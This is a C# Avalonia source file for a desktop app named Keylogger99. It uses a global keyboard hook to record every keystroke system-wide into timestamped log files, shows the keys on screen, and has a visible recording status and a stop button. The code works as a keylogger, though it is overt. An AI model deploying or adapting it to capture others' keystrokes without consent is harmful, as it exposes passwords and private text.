using Avalonia.Controls;
using Avalonia.Interactivity;
using Avalonia.Threading;
using SharpHook;
using System.Threading.Tasks;

namespace Keylogger99;

public partial class MainWindow : Window
{
    private string _currentLogFile = "log.txt";
    private TaskPoolGlobalHook? _hook;

    public MainWindow()
    {
        InitializeComponent();
        SetupHook();
    }

    private void SetupHook()
    {
        _hook = new TaskPoolGlobalHook();

        string timestamp = System.DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
        _currentLogFile = $"log_{timestamp}.txt";

        System.IO.File.AppendAllText(_currentLogFile, $"--- Session Started: {timestamp} ---\n");

        _hook.KeyPressed += (s, e) =>
        {
            string rawKey = e.Data.KeyCode.ToString().Replace("Vc", "");
        
            
            string formattedKey = rawKey switch
            {
                "Space" => " ",
                "Enter" => "\n[ENTER]\n",
                "Backspace" => "[BACKSPACE]",
                "Tab" => "\t",
                "LeftShift" or "RightShift" => "", 
                "Delete" => "[DEL]",
                _ => rawKey
            };

            try 
            {
                System.IO.File.AppendAllText(_currentLogFile, formattedKey);
            }
            catch (System.Exception ex)
            {
                System.Console.WriteLine($"Logging Error: {ex.Message}");
            }

            Dispatcher.UIThread.InvokeAsync(() =>
            {
                
                KeyLogDisplay.Text += formattedKey;
                StatusLabel.Text = $"Status: Recording to {_currentLogFile}";
                StatusLabel.Foreground = Avalonia.Media.Brushes.Green;
            });
        };
        
        Task.Run(() => _hook.Run());
    }

    private void OnStopClick(object sender, RoutedEventArgs e)
    {
        if (_hook != null && _hook.IsRunning)
        {
            
            _hook.Dispose(); 
        
            
            Dispatcher.UIThread.InvokeAsync(() => {
                StatusLabel.Text = "Status: STOPPED (Not Recording)";
                StatusLabel.Foreground = Avalonia.Media.Brushes.Red; // Turns the text red
            });

            
            System.IO.File.AppendAllText(_currentLogFile, "\n--- Session Manually Stopped ---\n");
        }
    }

    private void OnClearClick(object sender, RoutedEventArgs e)
    {
        KeyLogDisplay.Text = "";
    }
}